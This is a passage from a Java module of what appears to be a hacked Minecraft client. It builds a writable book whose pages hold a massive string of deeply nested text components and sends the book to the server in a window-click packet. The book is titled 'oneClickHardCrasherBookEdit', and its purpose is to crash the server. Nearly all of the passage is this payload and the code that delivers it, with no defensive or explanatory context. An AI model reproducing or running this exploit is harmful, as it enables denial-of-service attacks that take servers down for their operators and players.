,text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}],text:a}"));
            }

            comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
            comp.setString("title", "oneClickHardCrasherBookEdit");
            comp.setByte("resolved", (byte) 1);
            comp.setTag("pages", list);
            ItemStack stack = new ItemStack(Items.writable_book);
            stack.setTagCompound(comp);
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeItemStackToBuffer(stack);
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C0EPacketClickWindow(0, 0, 0, 1, stack, (short) 0));
        }
        toggle();
    }
}















